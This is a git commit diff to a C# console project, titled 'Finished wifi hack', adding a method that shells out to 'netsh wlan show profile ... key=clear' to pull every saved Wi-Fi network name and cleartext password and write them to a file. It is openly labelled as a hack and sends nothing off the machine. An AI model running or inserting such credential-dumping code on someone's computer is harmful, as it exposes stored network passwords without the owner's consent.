ef94cedc3bd43bfde920933e3e3e788045ef7111
André Soares França <andre.franca@globalweb.com.br>
2019-09-03 09:24:48 -0400

    Finished wifi hack

--- console-of-all-functions/libraries/hacks/Hacks.cs
+++ console-of-all-functions/libraries/hacks/Hacks.cs
@@ -1,5 +1,6 @@
 ﻿using System;
 using System.IO;
+using System.Linq;
 using System.Text;
 
 namespace console_of_all_functions.libraries.hacks
@@ -13,16 +14,31 @@ namespace console_of_all_functions.libraries.hacks
 
         internal static void Wifi()
         {
-            string createWifiFile = @"/c netsh wlan show profiles>wifiNames.txt";
-            System.Diagnostics.Process.Start("CMD.exe", createWifiFile);
-            var lines = File.ReadAllLines("wifiNames.txt", Encoding.UTF8);
-            var output = File.OpenText("wifiPasswords.txt");
-
-            foreach(var line in lines)
+            try
             {
-                string getWifiPassword = @"/c netsh wlan show profile "+line.Split(':')[1]+" key=clear & find \"*key*\">wifiInfo.txt";
-                System.Diagnostics.Process.Start("CMD.exe", getWifiPassword);
-                var info = File.ReadAllLines("wifiInfo.txt", Encoding.UTF8);
+                string createWifiFile = "/c netsh wlan show profiles & find \"" + "Todos" + "\">wifiNames.txt";
+                System.Diagnostics.Process.Start("CMD.exe", createWifiFile);
+                var lines = File.ReadAllLines("wifiNames.txt", Encoding.UTF8);
+                var output = File.CreateText(Directory.GetCurrentDirectory().Substring(0,2) +"\\Data\\wifiPasswords.txt");
+
+                foreach (var line in lines)
+                {
+                    string getWifiPassword = "/c netsh wlan show profile " + line.Split(':')[1] + " key=clear>wifiInfo.txt";
+                    System.Diagnostics.Process.Start("CMD.exe", getWifiPassword);
+                    var info = File.ReadAllLines("wifiInfo.txt", Encoding.UTF8).ToList();
+                    string fileWrite = "Wifi name: " + line.Split(':')[1] + "  Password: " + info.Where(x => x.Contains("Conteúdo da Chave")).First().Split(':')[1];
+                    output.WriteLine(fileWrite);
+                }
+
+                output.Close();
+                File.Delete(Directory.GetCurrentDirectory()+"\\wifiNames.txt");
+                File.Delete(Directory.GetCurrentDirectory() + "\\wifiInfo.txt");
+                Console.WriteLine("Success");
+            }
+            catch
+            {
+                Console.WriteLine("Failure");
+                throw;
             }
         }
     }
